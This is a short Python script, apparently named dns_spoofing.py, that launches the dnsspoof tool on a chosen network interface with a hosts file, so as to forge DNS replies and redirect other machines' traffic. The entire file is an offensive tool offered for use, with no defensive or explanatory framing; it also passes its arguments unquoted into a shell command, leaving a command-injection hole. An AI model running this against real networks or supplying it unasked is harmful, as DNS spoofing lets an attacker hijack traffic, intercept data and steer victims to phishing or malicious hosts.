import sys, subprocess

def start_dnsspoof(interface, hosts_file):
    cmd = f"dnsspoof -i {interface} -f {hosts_file}"
    proc = subprocess.Popen(cmd, shell=True)
    print(f"DNS spoofing started on {interface} with {hosts_file}")
    return proc

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 dns_spoofing.py <interface> <hosts_file>")
        sys.exit(1)
    start_dnsspoof(sys.argv[1], sys.argv[2])
